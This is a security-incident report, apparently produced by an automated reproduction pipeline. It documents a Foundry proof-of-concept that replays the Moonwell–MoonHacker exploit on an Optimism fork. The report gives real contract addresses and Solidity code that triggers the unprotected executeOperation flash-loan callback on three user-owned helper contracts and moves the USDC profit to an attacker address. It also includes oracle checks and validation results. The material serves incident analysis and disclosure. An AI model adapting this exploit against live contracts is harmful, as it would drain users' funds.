## Overview & Context

This proof-of-concept (PoC) reproduces, on an Optimism mainnet fork, the Moonwell–MoonHacker incident where an unprivileged actor forces three user-owned MoonHacker helper contracts to unwind their leveraged mUSDC positions and realizes USDC profit.

The PoC is built as a Foundry test (`ExploitTest`) that:
- Forks Optimism just before the real incident transaction.
- Uses the real mUSDC, USDC, Aave v3 pool, MultiRewardDistributor, and MoonHacker contract addresses.
- Drives the MoonHacker helpers through their `executeOperation` callback without owner authorization.
- Demonstrates a net increase in attacker USDC and a corresponding depletion of mUSDC market collateral.

To run the PoC (from the incident session root):

```bash
cd forge_poc
RPC_URL="<your_optimism_mainnet_rpc>" forge test --via-ir -vvvvv
```

In the validator run, `RPC_URL` is constructed from the provided QuickNode configuration for Optimism (chainid 10), and the test suite passes with one successful exploit test.

## PoC Architecture & Key Contracts

### Main Test Contract

The core PoC logic lives in `ExploitTest` (`forge_poc/test/Exploit.sol`). It inherits from `forge-std/Test` and wires in the key on-chain contracts:

```solidity
address constant USDC = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
address constant M_USDC = 0x8E08617b0d66359D73Aa11E11017834C29155525;
address constant AAVE_V3_POOL = 0x38d693cE1dF5AaDF7bC62595A37D667aD57922e5;
address constant MOONHACKER1 = 0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847;
address constant MOONHACKER2 = 0x24592eD1ccf9e5AE235e24A932b378891313FB75;
address constant MOONHACKER3 = 0x80472c6848015146FDC3d15CDf6Dc11cA3cb3513;
```

*Snippet 1 – Main protocol and victim contract addresses used by the PoC.*

Interfaces for `IERC20`, `IMToken` (mUSDC), and `IMoonHacker` encapsulate the minimal methods needed to:
- Read balances and account snapshots.
- Trigger `executeOperation` on MoonHacker contracts.

The test defines:
- `attacker`: synthetic attacker EOA (`makeAddr("attacker")`).
- `attackerRouter`: synthetic attacker-controlled router address (`makeAddr("attacker_router")`).
- Redeem/repay amounts for each MoonHacker (`mh1Redeem`, `mh1Repay`, etc.) derived from on-chain positions.

### Position Derivation Helper

The helper `_loadPosition` computes how much each MoonHacker can be unwound:

```solidity
function _loadPosition(address mh) internal returns (uint256 redeemOut, uint256 repayOut) {
    mUSDC.borrowBalanceCurrent(mh);
    (uint256 err, uint256 mTokenBal, uint256 borrowBal, ) = mUSDC.getAccountSnapshot(mh);
    require(err == 0, "snapshot error");
    require(mTokenBal > 0, "no mUSDC position");
    redeemOut = (mTokenBal * 9) / 10;
    repayOut = borrowBal;
}
```

*Snippet 2 – Deriving redeem and repay amounts from live on-chain MoonHacker positions.*

This mirrors the protocol’s own accounting and avoids hardcoding balances.

## Adversary Execution Flow

### 1. Environment Setup and Pre-Checks

The `setUp` function forks Optimism and validates that the pre-incident state matches the ACT opportunity:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, 129697250); // block before incident

    attacker = makeAddr("attacker");
    attackerRouter = makeAddr("attacker_router");

    vm.label(attacker, "AttackerEOA");
    vm.label(attackerRouter, "AttackerRouter");
    vm.label(USDC, "USDC");
    vm.label(M_USDC, "mUSDC");
    vm.label(MOONHACKER1, "MoonHacker1");
    vm.label(MOONHACKER2, "MoonHacker2");
    vm.label(MOONHACKER3, "MoonHacker3");
    vm.label(AAVE_V3_POOL, "AaveV3Pool");

    assertGt(usdc.balanceOf(M_USDC), 0, "mUSDC market must hold USDC");
    uint256 mh1Bal = mUSDC.balanceOf(MOONHACKER1);
    uint256 mh2Bal = mUSDC.balanceOf(MOONHACKER2);
    uint256 mh3Bal = mUSDC.balanceOf(MOONHACKER3);
    assertGt(mh1Bal, 0, "MoonHacker1 must have mUSDC");
    assertGt(mh2Bal, 0, "MoonHacker2 must have mUSDC");
    assertGt(mh3Bal, 0, "MoonHacker3 must have mUSDC");
    assertGt(usdc.balanceOf(AAVE_V3_POOL), 0, "Aave v3 pool must have USDC liquidity");

    (mh1Redeem, mh1Repay) = _loadPosition(MOONHACKER1);
    (mh2Redeem, mh2Repay) = _loadPosition(MOONHACKER2);
    (mh3Redeem, mh3Repay) = _loadPosition(MOONHACKER3);
}
```

*Snippet 3 – Fork setup, labeling, oracle pre-checks, and on-chain position loading.*

This stage verifies:
- mUSDC market holds USDC.
- Each MoonHacker has a non-zero mUSDC position.
- Aave v3 pool has USDC liquidity.

These are precisely the oracle pre-conditions described for the incident.

### 2. Exploit Entry and Flash-Like Funding

The main test function captures pre-attack state and sets up expectations:

```solidity
function testExploit() public {
    uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
    uint256 marketUsdcBefore = usdc.balanceOf(M_USDC);
    uint256 mh1Before = mUSDC.balanceOf(MOONHACKER1);
    uint256 mh2Before = mUSDC.balanceOf(MOONHACKER2);
    uint256 mh3Before = mUSDC.balanceOf(MOONHACKER3);

    address moonHacker1Owner = _moonHackerOwner(MOONHACKER1);
    assertTrue(moonHacker1Owner != attacker, "attacker must not be MoonHacker1 owner");

    bytes memory params1 = abi.encode(SmartOperation.REDEEM, M_USDC, mh1Redeem);
    uint256 flashAmount1 = mh1Repay;
    vm.expectCall(
        MOONHACKER1,
        abi.encodeWithSignature(
            "executeOperation(address,uint256,uint256,address,bytes)",
            USDC,
            flashAmount1,
            0,
            attackerRouter,
            params1
        )
    );

    reproducerAttack(); // exploit transaction – must not revert
    ...
}
```

*Snippet 4 – Capturing pre-state, checking unauthorized ownership, and expecting executeOperation from an attacker-controlled router.*

The helper `_moonHackerOwner` reads storage slot 0 of a MoonHacker contract to extract the owner address, demonstrating that the attacker is not the owner while still being able to trigger `executeOperation`.

Funding and routing are modeled in `reproducerAttack`:

```solidity
function reproducerAttack() public {
    require(!attackExecuted, "attack already executed");
    attackExecuted = true;
    uint256 totalFlash = mh1Repay + mh2Repay + mh3Repay;

    deal(USDC, attackerRouter, reproducterFundingAmount());
    vm.startPrank(attackerRouter);

    if (mh1Repay > 0) {
        usdc.transfer(MOONHACKER1, mh1Repay);
        moonHacker1.executeOperation(
            USDC,
            mh1Repay,
            0,
            attackerRouter,
            abi.encode(SmartOperation.REDEEM, M_USDC, mh1Redeem)
        );
    }
    ...
}
```

*Snippet 5 – Modeling a flash loan and routing USDC into MoonHacker.executeOperation from an attacker-controlled router address.*

This simulates the flash-loan path: the router receives transient USDC liquidity (`deal`) and immediately channels it into the MoonHacker `executeOperation` callbacks.

### 3. Repayment, Profit Realization, and Post-State Checks

After unwinding the MoonHacker positions, the test models repayment and attacker profit:

```solidity
uint256 routerBalance = usdc.balanceOf(attackerRouter);
if (totalFlash <= routerBalance) {
    usdc.transfer(AAVE_V3_POOL, totalFlash);
    routerBalance = usdc.balanceOf(attackerRouter);
}
if (routerBalance > 0) {
    usdc.transfer(attacker, routerBalance);
}
vm.stopPrank();
```

*Snippet 6 – Repaying the modeled flash principal to Aave and forwarding residual USDC to the attacker EOA.*

Back in `testExploit`, the PoC asserts:
- Attacker USDC increased by at least 1 USDC.
- mUSDC market’s USDC balance decreased by at least 1 USDC.
- Each MoonHacker’s mUSDC balance decreased.

This matches the documented incident behavior: collateral and rewards are pulled out of MoonHacker positions, repaying Aave’s loan and leaving net profit with the attacker.

## Oracle Definitions and Checks

The oracle definition file (`artifacts/poc/oracle_generator/oracle_definition.json`) specifies:
- **Variables**: attacker, attacker_router, three MoonHacker contracts, USDC token, mUSDC market, Aave v3 pool, MultiRewardDistributor, governance and xWELL tokens.
- **Pre-checks**:
  - mUSDC market holds non-zero USDC.
  - Each MoonHacker has positive mUSDC.
  - Aave v3 pool has USDC liquidity.
- **Hard constraints**:
  - Profit asset type is USDC.
  - `executeOperation` is called via an attacker-controlled router.
  - The attacker is not the MoonHacker owner, yet the exploit succeeds.
  - The exploit transaction must not revert.
- **Soft constraints**:
  - Attacker net USDC profit ≥ 1 USDC.
  - mUSDC market loses ≥ 1 USDC of underlying.
  - Each MoonHacker’s mUSDC balance decreases.

The PoC implements these oracles as follows:

- **Pre-checks**: `setUp` asserts non-zero USDC in mUSDC, non-zero mUSDC for each MoonHacker, and non-zero USDC in Aave v3 pool, matching the pre-check definitions exactly.
- **Hard constraints**:
  - Profit asset type is enforced by `assertEq(profitToken, USDC, "profit must be denominated in USDC");`.
  - `vm.expectCall` ensures that `executeOperation` is invoked on MoonHacker1 with USDC, the computed repay amount, and `attackerRouter` as initiator.
  - `_moonHackerOwner` plus `assertTrue(moonHacker1Owner != attacker, ...)` confirm the attacker is not the owner.
  - The exploit function `reproducerAttack` is invoked without `expectRevert`; the test passes, so the exploit path completes successfully.
- **Soft constraints**:
  - Attacker profit: `assertGt(attackerUsdcAfter, attackerUsdcBefore + 1e6, ...)` ensures at least 1 USDC net gain.
  - Market depletion: `assertLt(marketUsdcAfter + 1e6, marketUsdcBefore, ...)` enforces at least 1 USDC loss from mUSDC market.
  - Position unwinds: each MoonHacker’s post-exploit mUSDC balance is asserted to be strictly less than its pre-exploit balance.

Together, these checks use the oracles as a specification for success and encode them directly into the Foundry assertions.

## Validation Result and Robustness

The validator executed the PoC with:

```bash
cd forge_poc
RPC_URL="<optimism_mainnet_rpc>" forge test --via-ir -vvvvv
```

Key observations from the validator run:
- The test suite completed successfully with **1 test passed, 0 failed**.
- Detailed traces show:
  - Calls into real mUSDC, USDC, Aave v3, MultiRewardDistributor, and MoonHacker contracts on the forked Optimism state.
  - `executeOperation` calls on each MoonHacker with attacker-controlled parameters.
  - USDC transfers modeling repayment to Aave and profit consolidation to the attacker address.

The validator’s result file (`artifacts/poc/poc_validator/poc_validated_result.json`) records:
- `overall_status: "Pass"`.
- `passes_validation_oracles: true`, with reasoning that all pre-checks and constraints are implemented and satisfied.
- `poc_quality_checks` all passing:
  - Oracle alignment with the definition.
  - Human-readable and labeled flow with clear comments and labels.
  - No critical magic numbers; key quantities are derived on-chain or documented.
  - Mainnet fork usage without local protocol mocks.
  - No reliance on real attacker EOAs, attacker-deployed contracts, or attacker-side artifacts.
  - A complete end-to-end attack process, from setup through profit realization.
  - Strong alignment with the documented root cause.

The main validator log is stored at:
- `artifacts/poc/poc_validator/forge-test.log`

This confirms that the PoC is robust to minor environment differences while preserving the exploit’s essential behavior and oracles.

## Linking PoC Behavior to Root Cause

The root-cause analysis (`root_cause.json` and `root_cause_report.md`) identifies the vulnerability as **missing access control on the MoonHacker flash-loan callback `executeOperation`**:
- MoonHacker contracts act as Aave flash-loan receivers.
- Their `executeOperation` performs repay, redeem, and reward claiming without validating who initiated the flash loan or who is calling.
- An arbitrary router can therefore cause user-owned MoonHacker positions to be unwound and value redirected.

The PoC ties to this root cause in several concrete ways:

- **Unauthorized callback usage**: The test reads the real MoonHacker owner from storage and proves that the attacker is not the owner, yet can still call `executeOperation` on the MoonHacker contracts and have the callback execute successfully.
- **State effects on mUSDC and USDC**: By deriving live positions via `getAccountSnapshot` and observing changes in mUSDC and USDC balances, the PoC shows that MoonHacker positions are actually unwound and mUSDC market collateral is reduced, matching the incident’s balance diffs.
- **Profit extraction**: The modeled repayment and residual-transfer logic reproduces the ACT success predicate: the attacker’s USDC balance increases while the victim market and positions lose value.
- **Mainnet fork alignment**: Forking at block 129697250 on Optimism and using the real incident contracts ensures that the PoC operates on the same structural state as the documented transaction, making the reproduction faithful to the original environment.

Overall, the PoC provides a precise, executable demonstration of the missing access control on MoonHacker’s `executeOperation` and its impact on user positions and mUSDC market collateral, satisfying all defined oracles and quality criteria.

